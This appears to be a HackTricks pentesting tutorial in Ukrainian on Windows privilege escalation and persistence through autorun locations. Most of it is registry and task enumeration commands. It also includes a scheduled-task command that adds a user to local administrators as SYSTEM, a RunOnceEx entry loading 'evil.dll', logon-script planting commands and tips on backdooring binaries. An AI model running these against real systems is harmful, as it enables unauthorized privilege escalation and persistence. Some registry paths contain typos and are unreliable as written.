# Підвищення привілеїв за допомогою Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** можна використовувати для запуску програм під час **startup**. Подивіться, які бінарні файли налаштовані на запуск під час startup за допомогою:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Заплановані завдання

**Tasks** можуть бути заплановані для запуску з **певною частотою**. Подивіться, які бінарні файли заплановано запускати за допомогою:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Папки

Усі бінарні файли, розташовані в **папках Startup, будуть виконані під час запуску**. Найпоширеніші папки Startup — це ті, що перелічені далі, але папка Startup вказується в реєстрі. [Прочитайте це, щоб дізнатися де.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: вразливості **path traversal** під час архівного розпакування (такі як та, що використовувалась у WinRAR до 7.13 – CVE-2025-8088) можна використати, щоб **поміщати payloads безпосередньо в ці папки Startup під час декомпресії**, що призводить до виконання коду під час наступного входу користувача. Для детального розбору цієї техніки дивіться:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Запис реєстру **Wow6432Node** вказує на те, що ви використовуєте 64-bit версію Windows. Операційна система використовує цей ключ, щоб показувати окремий view HKEY_LOCAL_MACHINE\SOFTWARE для 32-bit applications, що працюють на 64-bit версіях Windows.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Ключі реєстру, відомі як **Run** і **RunOnce**, призначені для автоматичного запуску програм щоразу, коли користувач входить у систему. Командний рядок, призначений як значення даних ключа, обмежений 260 символами або менше.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

На Windows Vista та новіших версіях ключі реєстру **Run** і **RunOnce** не створюються автоматично. Записи в цих ключах можуть або безпосередньо запускати програми, або вказувати їх як залежності. Наприклад, щоб завантажити DLL file під час logon, можна використати ключ реєстру **RunOnceEx** разом із ключем "Depend". Це показано шляхом додавання запису реєстру для виконання "C:\temp\evil.dll" під час system start-up:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Якщо ви можете записувати в будь-який із згаданих registry всередині **HKLM**, ви можете підвищити привілеї, коли інший користувач увійде в систему.

> [!TIP]
> **Exploit 2**: Якщо ви можете перезаписати будь-які binaries, вказані в будь-якому з registry всередині **HKLM**, ви можете змінити цей binary, додавши backdoor, коли інший користувач увійде в систему, і підвищити привілеї.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Ярлики, розміщені в папці **Startup**, автоматично запускатимуть служби або застосунки під час входу користувача в систему або перезавантаження системи. Розташування папки **Startup** визначається в реєстрі як для області **Local Machine**, так і для **Current User**. Це означає, що будь-який ярлик, доданий у ці вказані розташування **Startup**, забезпечить запуск пов’язаного служби або програми після процесу входу або перезавантаження, що робить це простим методом для налаштування автоматичного запуску програм.

> [!TIP]
> Якщо ви можете перезаписати будь-яку \[User] Shell Folder у **HKLM**, ви зможете вказати її на папку, контрольовану вами, і розмістити backdoor, який виконуватиметься щоразу, коли користувач входить у систему, підвищуючи привілеї.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Це значення реєстру для окремого користувача може вказувати на script або command, який виконується, коли цей користувач входить у систему. Це переважно примітив **persistence**, тому що він запускається лише в контексті ураженого користувача, але його все одно варто перевіряти під час post-exploitation і авторунів.

> [!TIP]
> Якщо ви можете записати це значення для поточного користувача, ви можете повторно запустити виконання під час наступного interactive logon без потреби в admin rights. Якщо ви можете записати його для hive іншого користувача, ви можете отримати code execution, коли цей користувач увійде в систему.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes:

- Надавайте перевагу повним шляхам до `.bat`, `.cmd`, `.ps1` або інших launcher-файлів, які вже доступні для читання цільовому користувачу.
- Це переживає logoff/reboot, доки значення не буде видалено.
- На відміну від `HKLM\...\Run`, це саме по собі **не** надає elevation; це persistence в user-scope.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Зазвичай ключ **Userinit** має значення **userinit.exe**. Однак, якщо цей ключ змінено, вказаний executable також буде запущено **Winlogon** під час user logon. Аналогічно, ключ **Shell** призначений для вказівки на **explorer.exe**, який є default shell для Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Якщо ви можете перезаписати значення реєстру або binary, ви зможете підвищити privileges.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Перевірте ключ **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Зміна Safe Mode Command Prompt

У Windows Registry в `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` є значення **`AlternateShell`**, яке за замовчуванням встановлено в `cmd.exe`. Це означає, що коли під час запуску ви обираєте "Safe Mode with Command Prompt" (натискаючи F8), використовується `cmd.exe`. Але можна налаштувати комп’ютер так, щоб він автоматично запускався в цьому режимі без необхідності натискати F8 і вибирати його вручну.

Кроки для створення boot option для автоматичного запуску в "Safe Mode with Command Prompt":

1. Змініть атрибути файлу `boot.ini`, щоб прибрати прапорці read-only, system і hidden: `attrib c:\boot.ini -r -s -h`
2. Відкрийте `boot.ini` для редагування.
3. Додайте рядок на кшталт: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Збережіть зміни в `boot.ini`.
5. Повторно застосуйте початкові атрибути файлу: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Зміна ключа реєстру **AlternateShell** дозволяє налаштувати custom command shell, що потенційно може дати unauthorized access.
- **Exploit 2 (PATH Write Permissions):** Наявність write permissions до будь-якої частини системної змінної **PATH**, особливо перед `C:\Windows\system32`, дає змогу виконувати custom `cmd.exe`, який може бути backdoor, якщо систему запущено в Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Write access до `boot.ini` дає змогу автоматично запускати Safe Mode, що полегшує unauthorized access під час наступного reboot.

Щоб перевірити поточне значення **AlternateShell**, використайте ці команди:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup — це функція в Windows, яка **запускається до того, як робоче середовище буде повністю завантажене**. Вона надає пріоритет виконанню певних команд, які мають завершитися до продовження входу користувача в систему. Цей процес відбувається ще до запуску інших елементів автозавантаження, таких як записи в розділах реєстру Run або RunOnce.

Active Setup керується через такі ключі реєстру:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

У цих ключах існують різні підключі, кожен з яких відповідає окремому компоненту. Особливо цікавими є такі значення:

- **IsInstalled:**
- `0` означає, що команда компонента не буде виконуватися.
- `1` означає, що команда буде виконана один раз для кожного користувача, і це поведінка за замовчуванням, якщо значення `IsInstalled` відсутнє.
- **StubPath:** Визначає команду, яку виконає Active Setup. Це може бути будь-який коректний command line, наприклад запуск `notepad`.

**Security Insights:**

- Зміна або запис у ключ, де **`IsInstalled`** має значення `"1"` і вказано певний **`StubPath`**, може призвести до несанкціонованого виконання команди, потенційно для privilege escalation.
- Зміна binary file, на який посилається будь-яке значення **`StubPath`**, також може дати змогу виконати privilege escalation, за наявності достатніх прав.

Щоб переглянути конфігурації **`StubPath`** у компонентах Active Setup, можна використати такі команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) — це DLL-модулі, які додають додаткові можливості до Microsoft Internet Explorer. Вони завантажуються в Internet Explorer і Windows Explorer під час кожного запуску. Однак їх виконання можна заблокувати, встановивши ключ **NoExplorer** у 1, що запобігає їх завантаженню разом із екземплярами Windows Explorer.

BHOs сумісні з Windows 10 через Internet Explorer 11, але не підтримуються в Microsoft Edge, браузері за замовчуванням у новіших версіях Windows.

Щоб переглянути BHOs, зареєстровані в системі, можна перевірити такі ключі реєстру:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Кожен BHO представлений своїм **CLSID** у реєстрі, що слугує унікальним ідентифікатором. Детальну інформацію про кожен CLSID можна знайти в `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Для запиту BHOs у реєстрі можна використовувати такі команди:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Зауважте, що реєстр міститиме 1 новий запис реєстру для кожного dll і він буде представлений через **CLSID**. Інформацію про CLSID можна знайти в `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Відкрити команду

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Параметри виконання файлів зображень
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Зверніть увагу, що всі місця, де можна знайти autoruns, **вже перевіряються** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Однак для **більш повного списку файлів, що автоматично виконуються**, ви можете використати [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) від systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Більше

**Знайдіть більше Autoruns, як-от registries, у** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
